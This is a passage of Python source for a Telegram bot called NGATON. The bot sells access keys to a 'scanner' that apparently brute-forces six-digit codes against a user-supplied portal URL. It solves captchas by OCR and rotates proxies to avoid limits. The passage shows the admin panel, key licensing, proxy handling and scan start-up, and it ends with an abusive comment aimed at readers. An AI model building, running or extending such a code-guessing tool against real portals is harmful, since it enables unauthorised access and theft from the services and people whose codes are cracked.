    if not is_admin(uid): return
    context.user_data["awaiting_broadcast"] = True
    bu = load_bot_users()
    await update.message.reply_text(
        f"📢 <b>BROADCAST</b>\n━━━━━━━━━━━━━━━━━━\n"
        f"👥 <b>{len(bu)}</b> recipients\nMessage →",
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ CANCEL", callback_data="admin_panel")]]))

async def clearall_command(update, context, *a, **kw):
    uid = update.effective_user.id
    if not is_admin(uid): return
    keys = load_keys(); users = load_users(); bu = load_bot_users()
    await update.message.reply_text(
        f"🧹 <b>CLEAR ALL</b>\n━━━━━━━━━━━━━━━━━━\n"
        f"🔑 Keys: <b>{len(keys)}</b>\n"
        f"👥 Users: <b>{len(users)}</b>\n"
        f"📇 Bot Users: <b>{len(bu)}</b>\n"
        "⚠️ Are you sure you want to delete it?",
        parse_mode=ParseMode.HTML, reply_markup=clear_all_confirm())

async def allhits_command(update, context, *a, **kw):
    uid = update.effective_user.id
    if not is_admin(uid): return
    lines = []; grand = 0
    for u, st in user_scanners.items():
        h = st.get("hit_details", [])
        if h: lines.append(f"<code>{u}</code> — <b>{len(h)}</b>"); grand += len(h)
    if not lines:
        await update.message.reply_text("📋 No hits.", reply_markup=back_markup()); return
    body = "\n".join(lines)
    if len(body) > 3500: body = body[:3500] + "\n<i>...</i>"
    await update.message.reply_text(f"📊 <b>All Hits — {grand}</b>\n\n{body}",
        parse_mode=ParseMode.HTML, reply_markup=back_markup())

async def users_command(update, context, *a, **kw):
    uid = update.effective_user.id
    if not is_admin(uid): return
    active = []
    for u, st in user_scanners.items():
        if st.get("scanner_task") and not st["scanner_task"].done():
            active.append((u, st.get("uname", ""), st.get("name", ""), st["stats"]["tried"], st["stats"]["hits"]))
    if not active:
        await update.message.reply_text("📋 No active users.", reply_markup=back_markup()); return
    lines = ["👥 <b>ACTIVE SCANS</b>\n━━━━━━━━━━━━━━━━━━"]
    for u, un, nm, t, h in active:
        tag = f"@{un}" if un else (nm or "?")
        lines.append(f"▸ <code>{u}</code> · {tag}\n   tried: {t:,} · hits: {h}")
    body = "\n".join(lines)
    await update.message.reply_text(body, parse_mode=ParseMode.HTML, reply_markup=back_markup())

# ═══════════════════════════════════════════════════════════════
#  CALLBACKS
# ═══════════════════════════════════════════════════════════════

async def handle_callbacks(update, context, *a, **kw):
    query = update.callback_query
    uid = update.effective_user.id
    data = query.data
    u = update.effective_user
    try: track_bot_user(u)
    except Exception: pass
    try: await query.answer()
    except Exception: pass

    ud = get_ud(uid)
    ud["uname"] = u.username or ""
    ud["name"] = u.first_name or ""

    if data == "stop_scan":
        if ud.get("scanner_task") and not ud["scanner_task"].done():
            ud["stopped_by_user"] = True
            ud["_export_sent"] = False
            ud["stop_event"].set()
            ud["dash_update_event"].set()
            try:
                await query.edit_message_text(
                    "🛑 <b>STOPPING...</b>\n📄 Exporting hits...",
                    parse_mode=ParseMode.HTML, reply_markup=back_markup())
            except Exception: pass
        else:
            try:
                await query.edit_message_text(
                    "ℹ️ Nothing running.",
                    parse_mode=ParseMode.HTML, reply_markup=back_markup())
            except Exception: pass
        return

    if data == "proxy_check_stop":
        pc = user_proxy_checks.get(uid)
        if pc and pc.get("stop_event"): pc["stop_event"].set()
        return

    if data == "btn_enter_key":
        context.user_data["waiting_for_key"] = True
        try:
            await query.edit_message_text(
                "🔑 <b>ENTER KEY</b>\nFormat: <code>XXXX-XXXX-XXXX-XXXX</code>",
                parse_mode=ParseMode.HTML, reply_markup=key_entry_markup())
        except Exception: pass
        return

    if data == "btn_back_to_access":
        context.user_data["waiting_for_key"] = False
        ok, msg = check_user_access(uid)
        if ok:
            try:
                await query.edit_message_text(main_menu_text(uid), parse_mode=ParseMode.HTML,
                    reply_markup=main_menu(is_admin(uid)))
            except Exception: pass
        else:
            try:
                await query.edit_message_text(
                    f"🔐 <b>ACCESS REQUIRED</b>\n👤 <code>{uid}</code>",
                    parse_mode=ParseMode.HTML, reply_markup=access_markup())
            except Exception: pass
        return

    if data.startswith("admin_") or data.startswith("extend_"):
        if not is_admin(uid):
            try: await query.answer("Admin only", show_alert=True)
            except Exception: pass
            return

    try:
        if data == "admin_panel":
            await query.edit_message_text(admin_panel_text(), parse_mode=ParseMode.HTML,
                                          reply_markup=admin_panel_markup()); return
        if data == "admin_list_admins":
            admins = load_admin_ids()
            lines = ["👑 <b>ADMINS</b>\n━━━━━━━━━━━━━━━━━━"]
            for i, a in enumerate(admins, 1):
                tag = " (hardcoded)" if a in ADMIN_IDS else ""
                lines.append(f"{i}. <code>{a}</code>{tag}")
            await query.edit_message_text("\n".join(lines), parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🦇 BACK", callback_data="admin_panel")]])); return
        if data == "admin_gen_key":
            await query.edit_message_text("🔑 Duration:", parse_mode=ParseMode.HTML,
                reply_markup=admin_duration_menu()); return
        if data.startswith("admin_dur_"):
            dur = data[len("admin_dur_"):]
            if dur == "unlimited": sec, label = 0, "♾ Unlimited"
            else:
                sec, label = DURATION_MAP.get(dur, (None, None))
                if sec is None: return
            context.user_data["admin_gen_duration"] = {"sec": sec, "label": label}
            context.user_data["admin_waiting"] = "gen_key_user"
            await query.edit_message_text(f"🔑 <b>{label}</b>\nUser ID →",
                parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🦇 BACK", callback_data="admin_gen_key")]])); return
        if data == "admin_del_key":
            context.user_data["admin_waiting"] = "del_key_input"
            await query.edit_message_text("🗑 User ID / Key →", parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🦇 BACK", callback_data="admin_panel")]])); return
        if data == "admin_list_keys":
            keys = load_keys()
            if not keys: body = "<i>No keys.</i>"
            else:
                lines = []
                for k, v in keys.items():
                    u_ = v.get("user_id", "?"); lb = v.get("label", "?")
                    su = "✅" if v.get("used_by") else "🆓"
                    lines.append(f"🔑 <code>{k}</code>\n   👤 <code>{u_}</code> · {lb} {su}")
                body = "\n\n".join(lines)
            if len(body) > 3500: body = body[:3500] + "\n<i>...</i>"
            await query.edit_message_text(f"📋 Keys: <code>{len(keys)}</code>\n\n{body}",
                parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🦇 BACK", callback_data="admin_panel")]])); return
        if data == "admin_users_list":
            users = load_users()
            lines = [f"👥 <b>USERS</b> ({len(users)})"]; nt = time.time()
            for u_, info in list(users.items())[:30]:
                e = info.get("expires_at", 0)
                if e == 0: st = "♾"
                elif nt < e:
                    r = int(e - nt); st = f"⏳ {r//86400}d {(r%86400)//3600}h"
                else: st = "🔴"
                lines.append(f"<code>{u_}</code> — {st}")
            await query.edit_message_text("\n".join(lines), parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🦇 BACK", callback_data="admin_panel")]])); return
        if data == "admin_bot_users":
            bu = load_bot_users()
            su = sorted(bu.values(), key=lambda x: x.get("last_seen", 0), reverse=True)
            lines = [f"📇 <b>BOT USERS</b> ({len(bu)})"]
            for info in su[:30]:
                u_ = info.get("id", "?"); n = info.get("first_name", "") or "?"
                un = info.get("username", "")
                lines.append(f"<code>{u_}</code> — {n} @{un}")
            body = "\n".join(lines)
            if len(body) > 3500: body = body[:3500] + "\n<i>...</i>"
            await query.edit_message_text(body, parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🦇 BACK", callback_data="admin_panel")]])); return
        if data == "admin_set_unlimited":
            context.user_data["admin_waiting"] = "set_unlimited"
            await query.edit_message_text("♾ User ID →", parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🦇 BACK", callback_data="admin_panel")]])); return
        if data == "admin_bot_stats":
            pm = get_pm(); tp, ap = pm.stats()
            users = load_users(); keys = load_keys(); bu = load_bot_users()
            active = sum(1 for st in user_scanners.values()
                         if st.get("scanner_task") and not st["scanner_task"].done())
            await query.edit_message_text(
                f"📊 <b>BOT STATS</b>\n━━━━━━━━━━━━━━━━━━\n"
                f"📇 Bot Users   : <code>{len(bu)}</code>\n"
                f"👥 Activated   : <code>{len(users)}</code>\n"
                f"🔑 Keys        : <code>{len(keys)}</code>\n"
                f"🔀 Proxies     : <code>{ap}/{tp}</code>\n"
                f"▶️ Active      : <code>{active}</code>\n"
                "━━━━━━━━━━━━━━━━━━",
                parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🦇 BACK", callback_data="admin_panel")]])); return
        if data == "admin_broadcast":
            context.user_data["awaiting_broadcast"] = True
            bu = load_bot_users()
            await query.edit_message_text(
                f"📢 <b>BROADCAST</b>\n━━━━━━━━━━━━━━━━━━\n"
                f"👥 <b>{len(bu)}</b> recipients\nMessage →",
                parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ CANCEL", callback_data="admin_panel")]])); return
        if data == "admin_clear_all_keys":
            keys = load_keys(); users = load_users(); bu = load_bot_users()
            await query.edit_message_text(
                f"🧹 <b>CLEAR ALL</b>\n━━━━━━━━━━━━━━━━━━\n"
                f"🔑 {len(keys)} · 👥 {len(users)} · 📇 {len(bu)}\n"
                "⚠️ Are you sure you want to delete it?",
                parse_mode=ParseMode.HTML, reply_markup=clear_all_confirm()); return
        if data == "admin_clear_all_confirm":
            save_keys({}); save_users({}); save_bot_users({})
            await query.edit_message_text(
                f"✅ <b>ALL CLEARED</b>\n\n🕐 {now_mm().strftime('%Y-%m-%d %I:%M %p')}",
                parse_mode=ParseMode.HTML, reply_markup=admin_panel_markup()); return
        if data == "admin_close":
            await query.edit_message_text(main_menu_text(uid), parse_mode=ParseMode.HTML,
                reply_markup=main_menu(is_admin(uid))); return

        if data == "btn_reset_job":
            await query.edit_message_text(
                "♻️ <b>RESET JOB</b>\n\n"
                "Delete tried codes + saved state + hits file ။\n"
                "Are you sure?",
                parse_mode=ParseMode.HTML, reply_markup=reset_job_confirm()); return
        if data == "reset_job_confirm":
            clear_saved_state(uid)
            clear_tried(uid)
            clear_hits_file(uid)
            await query.edit_message_text(
                "✅ <b>RESET DONE</b>\n\n🔄 Ready to start fresh",
                parse_mode=ParseMode.HTML, reply_markup=main_menu(is_admin(uid))); return
        if data == "btn_update_portal":
            ud["state"] = "waiting_for_portal_url"
            await query.edit_message_text(
                "🔮 <b>PORTAL BINDING</b>\n\nSend Portal URL.\n\n"
                "⚠️ URL change → job resets + hits file cleared",
                parse_mode=ParseMode.HTML, reply_markup=back_markup()); return
        if data == "btn_mode_menu":
            await query.edit_message_text("📜 <b>SELECT MODE</b>",
                parse_mode=ParseMode.HTML, reply_markup=mode_menu()); return
        if data == "btn_back_main":
            for f in ("waiting_for_proxy_text", "waiting_for_portal_url",
                      "waiting_for_digit", "waiting_for_workers"):
                context.user_data.pop(f, None)
            ud["state"] = None
            await query.edit_message_text(main_menu_text(uid), parse_mode=ParseMode.HTML,
                reply_markup=main_menu(is_admin(uid))); return
        if data == "btn_back_mode":
            context.user_data["waiting_for_digit"] = False
            ud["state"] = None
            await query.edit_message_text("📜 <b>SELECT MODE</b>",
                parse_mode=ParseMode.HTML, reply_markup=mode_menu()); return
        if data.startswith("set_mode_"):
            nm = data[len("set_mode_"):]
            if nm == "custom":
                ud["mode"] = "custom"; ud["char_set"] = CHARSET_DIGITS
                ud["code_len"] = 6; ud["state"] = "waiting_for_digit"
                await query.edit_message_text(
                    "⭐ <b>CUSTOM START</b>\n\nSend start digit (0-9):",
                    parse_mode=ParseMode.HTML, reply_markup=back_markup("btn_back_mode")); return
            if nm not in _MODE_SPEC: return
            ud["mode"] = nm
            cs, ln = _MODE_SPEC[nm]
            ud["char_set"] = "".join(cs); ud["code_len"] = ln; ud["start_digit"] = None
            await query.edit_message_text(
                f"✅ Mode: <code>{MODES.get(nm, nm)}</code>",
                parse_mode=ParseMode.HTML, reply_markup=main_menu(is_admin(uid))); return
        if data == "btn_add_proxies":
            ud["state"] = "waiting_for_proxy_text"
            await query.edit_message_text(
                "🕷️ <b>ADD PROXIES</b>\n\nFormat:\n<code>123.45.67.89:8080</code>\n<code>socks5://user:pass@host:1080</code>",
                parse_mode=ParseMode.HTML, reply_markup=back_markup()); return
        if data == "btn_proxy_checker":
            await query.edit_message_text("🕷️ Starting...",
                reply_markup=back_markup())
            asyncio.create_task(run_proxy_check(context, query.message.chat_id, uid)); return
        if data == "btn_manual_url":
            ud["state"] = "waiting_for_proxy_url"
            await query.edit_message_text("🔗 <b>MANUAL URL</b>\n\nSend URL →",
                parse_mode=ParseMode.HTML, reply_markup=back_markup()); return
        if data == "btn_clear_proxies":
            get_pm().clear_file()
            await query.edit_message_text("🧹 <b>CLEARED</b>",
                parse_mode=ParseMode.HTML, reply_markup=back_markup()); return
        if data == "btn_proxy_status":
            pm = get_pm(); tp, ap = pm.stats()
            sample = pm.proxies[:5] if pm.proxies else []
            ss = "\n".join(f"  ▸ <code>{p}</code>" for p in sample) if sample else "  💀 None"
            ml = "⚡ DIRECT" if ap == 0 else f"🕷️ {ap}"
            await query.edit_message_text(
                f"👁️ <b>STATUS</b>\n┌───────────────────────┐\n  {ml}\n└───────────────────────┘\n"
                f"<b>Sample:</b>\n{ss}",
                parse_mode=ParseMode.HTML, reply_markup=back_markup()); return

        if data == "btn_start_scanner":
            if not ud.get("portal_url"):
                await query.edit_message_text(
                    "❌ <b>Portal URL not set!</b>",
                    parse_mode=ParseMode.HTML, reply_markup=main_menu(is_admin(uid)))
                return

            
            if ud.get("scanner_task") and not ud["scanner_task"].done():
                ud["stop_event"].set()
                ud["dash_update_event"].set()

            saved = get_saved_state(uid)

            if saved and saved.get("url") == ud.get("portal_url"):
                ud["stats"] = {
                    "tried": saved.get("tried", 0),
                    "hits": saved.get("hits", 0),
                    "limits": saved.get("limits", 0),
                    "net": saved.get("net", 0),
                    "expired": 0,
                    "failed": saved.get("failed", 0),
                    "start_time": time.time(),
                }
                ud["hit_details"] = deserialize_hits(saved.get("hit_details", []))
                ud["last_hit"] = saved.get("last_hit")
                ud["counter"] = saved.get("counter", 600000)
                ud["mode"] = saved.get("mode", ud.get("mode", "num6"))
                if ud["mode"] in _MODE_SPEC:
                    cs, ln = _MODE_SPEC[ud["mode"]]
                    ud["char_set"] = "".join(cs)
                    ud["code_len"] = ln
                ud["tried_codes"] = load_tried(uid)
                ud["recent_logs"] = [x for x in ud.get("recent_logs", []) if x.startswith("🔥")]
            else:
                if saved and saved.get("url") != ud.get("portal_url"):
                    clear_saved_state(uid)
                    clear_tried(uid)
                clear_hits_file(uid)
                ud["stats"] = {"tried": 0, "hits": 0, "limits": 0, "net": 0,
                               "expired": 0, "failed": 0, "start_time": time.time()}
                ud["hit_details"] = []
                ud["tried_codes"] = set()
                ud["recent_logs"] = []
                ud["CURRENT_CODE"] = "----"
                ud["last_hit"] = None
                ud["counter"] = 600000

           
            new_run_id = ud.get("run_id", 0) + 1
            ud["run_id"] = new_run_id
            ud["stop_event"] = asyncio.Event()
            ud["dash_update_event"] = asyncio.Event()
            ud["balance_queue"] = asyncio.Queue()
            ud["dash_msg_id"] = query.message.message_id
            ud["scanner_task"] = None
            ud["stopped_by_user"] = False
            ud["_export_sent"] = False

            task = asyncio.create_task(run_scanner(context, uid, new_run_id))
            ud["scanner_task"] = task
            return

    except Exception as e:
        tprint(f"❌ CB ERROR · {type(e).__name__} · {e}", cR)

# ═══════════════════════════════════════════════════════════════
#  TEXT
# ═══════════════════════════════════════════════════════════════

async def handle_text(update, context, *a, **kw):
    uid = update.effective_user.id
    ud = get_ud(uid)
    state = ud.get("state")
    text = (update.message.text or "").strip()
    u = update.effective_user
    try: track_bot_user(u)
    except Exception: pass
    ud["uname"] = u.username or ""
    ud["name"] = u.first_name or ""

    try:
        if context.user_data.get("awaiting_broadcast") and is_admin(uid):
            context.user_data["awaiting_broadcast"] = False
            if not text:
                await update.message.reply_text("❌ Empty"); return
            bu = load_bot_users()
            sent = 0; failed = 0
            for u_ in bu.keys():
                try:
                    await context.bot.send_message(int(u_), text, parse_mode=ParseMode.HTML)
                    sent += 1
                except Exception: failed += 1
                await asyncio.sleep(0.05)
            await update.message.reply_text(
                f"✅ <b>Broadcast Done</b>\n📤 {sent}\n❌ {failed}",
                parse_mode=ParseMode.HTML, reply_markup=admin_panel_markup()); return

        if context.user_data.get("waiting_for_key"):
            context.user_data["waiting_for_key"] = False
            key = text.upper().strip()
            if not re.match(r"^[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}$", key):
                await update.message.reply_text("❌ Invalid format", reply_markup=access_markup()); return
            keys = load_keys()
            if key not in keys:
                await update.message.reply_text("❌ Invalid key", reply_markup=access_markup()); return
            info = keys[key]
            if info.get("used_by") and int(info["used_by"]) != uid:
                await update.message.reply_text(
                    f"⚠️ Used by <code>{info['used_by']}</code>",
                    parse_mode=ParseMode.HTML, reply_markup=access_markup()); return
            target = info.get("user_id")
            if target and int(target) != uid and not is_admin(uid):
                await update.message.reply_text(
                    f"⚠️ For <code>{target}</code>",
                    parse_mode=ParseMode.HTML, reply_markup=access_markup()); return
            sec = int(info.get("duration_sec", 0))
            users = load_users()
            if sec == 0:
                users[str(uid)] = {"expires_at": 0, "via_key": key}
                label = "♾"; exp_str = "♾"; exp_ts = 0
            else:
                exp_ts = int(time.time()) + sec
                users[str(uid)] = {"expires_at": exp_ts, "via_key": key}
                label = info.get("label", "?"); exp_str = format_expiry_mm(exp_ts)
            save_users(users)
            keys[key]["used_by"] = uid
            keys[key]["used_at"] = time.time()
            keys[key]["activated_expires_at"] = exp_ts
            save_keys(keys)
            await update.message.reply_text(
                f"🎊 <b>ACCESS GRANTED</b>\n🔑 <code>{key}</code>\n⏱ {label}\n⌛ {exp_str}",
                parse_mode=ParseMode.HTML, reply_markup=main_menu(is_admin(uid))); return

        admin_wait = context.user_data.get("admin_waiting")
        if admin_wait and is_admin(uid):
            if admin_wait == "gen_key_user":
                if not text.isdigit():
                    await update.message.reply_text("❌ Digits only"); return
                target = int(text)
                di = context.user_data.get("admin_gen_duration") or {"sec": 3600, "label": "1 Hour"}
                sec, label = di["sec"], di["label"]
                keys = load_keys()
                nk = generate_unique_key(keys)
                keys[nk] = {"duration_sec": sec, "label": label, "user_id": target,
                            "created_by": uid, "created_at": time.time(),
                            "used_by": None, "activated_expires_at": 0}
                save_keys(keys)
                exp_ts = int(time.time()) + sec if sec > 0 else 0
                context.user_data["admin_waiting"] = None
                context.user_data.pop("admin_gen_duration", None)
                await update.message.reply_text(
                    f"✅ <b>KEY</b>\n👤 <code>{target}</code>\n⏱ {label}\n"
                    f"🔑 <code>{nk}</code>\n⌛ {format_expiry_mm(exp_ts)}",
                    parse_mode=ParseMode.HTML,
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("🔑 ANOTHER", callback_data="admin_gen_key"),
                         InlineKeyboardButton("🦇 ADMIN", callback_data="admin_panel")],
                    ])); return
            if admin_wait == "del_key_input":
                keys = load_keys(); deleted = None
                if text in keys:
                    deleted = text; del keys[text]; save_keys(keys)
                else:
                    for k, v in list(keys.items()):
                        if str(v.get("user_id", "")) == text.replace(" ", ""):
                            deleted = k; del keys[k]
                    if deleted: save_keys(keys)
                context.user_data["admin_waiting"] = None
                await update.message.reply_text(
                    f"✅ <code>{deleted}</code>" if deleted else "❌ Not found",
                    parse_mode=ParseMode.HTML,
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🦇 ADMIN", callback_data="admin_panel")]])); return
            if admin_wait == "set_unlimited":
                try:
                    t = int(text.strip())
                    users = load_users()
                    users[str(t)] = {"expires_at": 0, "set_by": uid, "set_at": time.time()}
                    save_users(users)
                    context.user_data["admin_waiting"] = None
                    await update.message.reply_text(f"✅ <code>{t}</code> → ♾",
                        parse_mode=ParseMode.HTML,
                        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🦇 ADMIN", callback_data="admin_panel")]]))
                except Exception:
                    await update.message.reply_text("❌ Invalid")
                return

        if not is_admin(uid):
            ok, msg = check_user_access(uid)
            if not ok:
                await update.message.reply_text(
                    f"🔐 <b>ACCESS REQUIRED</b>\n👤 <code>{uid}</code>",
                    parse_mode=ParseMode.HTML, reply_markup=access_markup()); return

        if state == "waiting_for_portal_url":
            if not text.lower().startswith(("http://", "https://")):
                await update.message.reply_text("❌ Invalid URL", reply_markup=back_markup()); return
            old = ud.get("portal_url")
            changed = (old is not None and old != text)
            ud["portal_url"] = text; ud["state"] = None
            set_user_portal(uid, text)
            if changed:
                clear_saved_state(uid)
                clear_tried(uid)
                clear_hits_file(uid)
                await update.message.reply_text(
                    "🔄 <b>URL CHANGED</b>\n🧹 Cleared tried + state + hits\n✅ New saved",
                    parse_mode=ParseMode.HTML, reply_markup=main_menu(is_admin(uid)))
            else:
                await update.message.reply_text("✅ <b>Portal Saved</b>",
                    parse_mode=ParseMode.HTML, reply_markup=main_menu(is_admin(uid)))
            return
        if state == "waiting_for_digit":
            ud["start_digit"] = text if (text in ud["char_set"] and len(text) == 1) else "0"
            ud["state"] = None
            await update.message.reply_text(f"✅ Digit = <code>{ud['start_digit']}</code>",
                parse_mode=ParseMode.HTML, reply_markup=main_menu(is_admin(uid))); return
        if state == "waiting_for_proxy_url":
            if not text.lower().startswith("http"):
                await update.message.reply_text("❌ Invalid URL", reply_markup=back_markup()); return
            ud["state"] = None
            await update.message.reply_text("⏳ Checking...", reply_markup=back_markup())
            asyncio.create_task(run_proxy_check(context, update.message.chat_id, uid, sources=[text])); return
        if state == "waiting_for_proxy_text":
            lines = [l.strip() for l in text.splitlines() if l.strip()]
            if not lines:
                await update.message.reply_text("❌ Empty", reply_markup=back_markup()); return
            pm = get_pm(); added = pm.add(lines); tp, ap = pm.stats()
            ud["state"] = None
            await update.message.reply_text(
                f"✅ <b>Proxies Added</b>\n➕ {added}\n📊 {tp}\n✅ {ap}",
                parse_mode=ParseMode.HTML, reply_markup=main_menu(is_admin(uid))); return

        if not state:
            await update.message.reply_text(main_menu_text(uid),
                parse_mode=ParseMode.HTML, reply_markup=main_menu(is_admin(uid)))
            return

    except Exception as e:
        tprint(f"❌ TXT ERROR · {type(e).__name__} · {e}", cR)

# ═══════════════════════════════════════════════════════════════
#  HEARTBEAT
# ═══════════════════════════════════════════════════════════════

async def heartbeat_loop():
    while True:
        try:
            await asyncio.sleep(HEARTBEAT_SEC)
            active = sum(1 for ud in user_scanners.values()
                         if ud.get("scanner_task") and not ud["scanner_task"].done())
            if active == 0:
                continue
            total_tried = sum(ud["stats"].get("tried", 0) for ud in user_scanners.values())
            total_hits = sum(len(ud.get("hit_details", [])) for ud in user_scanners.values())
            tprint(f"⚡ alive · active={active} · tried={total_tried:,} · hits={total_hits}", cG)
        except asyncio.CancelledError:
            break
        except Exception:
            pass

# ═══════════════════════════════════════════════════════════════
#  HTTP
# ═══════════════════════════════════════════════════════════════

def _run_http():
    port = int(os.environ.get("PORT", 8080))
    class H(BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(b"NGATON alive")
        def log_message(self, *a): pass
    try: HTTPServer(("0.0.0.0", port), H).serve_forever()
    except Exception: pass

def start_web():
    threading.Thread(target=_run_http, daemon=True).start()

async def _err_handler(update, context):
    try:
        e = context.error
        tprint(f"❌ ERROR · {type(e).__name__} · {e}", cR)
    except Exception: pass

async def _post_init(app):
    global _heartbeat_started
    if _heartbeat_started: return
    _heartbeat_started = True
    asyncio.create_task(heartbeat_loop())

# ═══════════════════════════════════════════════════════════════
#  MAIN
# ═══════════════════════════════════════════════════════════════

def main():
    _synced = _gh_sync_down()
    if _gh_enabled():
        print(f"[GitHub DB] synced {_synced} data file(s) from {GH_OWNER}/{GH_REPO}", flush=True)
    for f, d in [(KEYS_FILE, {}), (USERS_FILE, {}), (BOT_USERS_FILE, {}), (ADMIN_IDS_FILE, [])]:
        if not os.path.exists(f):
            try:
                with open(f, "w", encoding="utf-8") as fp: json.dump(d, fp)
            except OSError: pass

    print()
    print(f"{cB}{cM}════════════════════════════════════════════════════════{cX}")
    print(f"{cB}{cM}   ⚡  NGATON v3.1 · SPEED EDITION ⚡{cX}")
    print(f"{cB}{cM}   {CONTACT_USERNAME}{cX}")
    print(f"{cB}{cM}════════════════════════════════════════════════════════{cX}")
    print()

    if not HAS_OCR:
        tprint("❌ ddddocr MISSING — pip install ddddocr --no-deps", cR)
    else:
        tprint("✅ ddddocr OK", cG)

    if not HAS_SOCKS:
        tprint("⚠️ aiohttp-socks MISSING", cY)
    else:
        tprint("✅ aiohttp-socks OK", cG)

    start_web()

    app = (Application.builder().token(BOT_TOKEN)
           .post_init(_post_init)
           .build())
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("stop", stop_command))
    app.add_handler(CommandHandler("myid", myid_command))
    app.add_handler(CommandHandler("mykey", mykey_command))
    app.add_handler(CommandHandler("addadmin", addadmin_command))
    app.add_handler(CommandHandler("removeadmin", removeadmin_command))
    app.add_handler(CommandHandler("broadcast", broadcast_command))
    app.add_handler(CommandHandler("clearall", clearall_command))
    app.add_handler(CommandHandler("allhits", allhits_command))
    app.add_handler(CommandHandler("users", users_command))
    app.add_handler(CallbackQueryHandler(handle_callbacks))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    app.add_error_handler(_err_handler)

    pm = get_pm(); tp, ap = pm.stats()
    tprint(f"🕷️ Proxies: {ap}/{tp}", cC)
    tprint(f"👥 Workers: {NUM_WORKERS} (hardcoded)", cC)
    tprint(f"💠 Balance Workers: {BALANCE_WORKERS}", cC)
    tprint(f"⚡ CODE_DELAY: {CODE_DELAY}s · CAPTCHA_RETRY: {CAPTCHA_MAX_RETRY}", cC)
    tprint(f"⚡ Dashboard: {DASH_MIN_INTERVAL}s · Heartbeat: {HEARTBEAT_SEC}s", cC)
    tprint("🚀 Starting polling...", cG)
    print()

    try:
        app.run_polling(drop_pending_updates=True, allowed_updates=None)
    finally:
        global _bal_session
        try:
            if _bal_session is not None and not _bal_session.closed:
                loop = asyncio.new_event_loop()
                loop.run_until_complete(_bal_session.close())
                loop.close()
        except Exception:
            pass

if __name__ == "__main__":
    try: main()
    except KeyboardInterrupt:
        print()
        tprint("👋 Stopped", cY)
    except BaseException as e:
        print()
        tprint(f"❌ FATAL · {type(e).__name__} · {e}", cR)

# ===============================================================
# I'm not you father. so you can't just do whatever you want.
# If you don't say what you want to say, study first.
# Asshole! If you think this is AI, go fuck yourself.
#================================================================
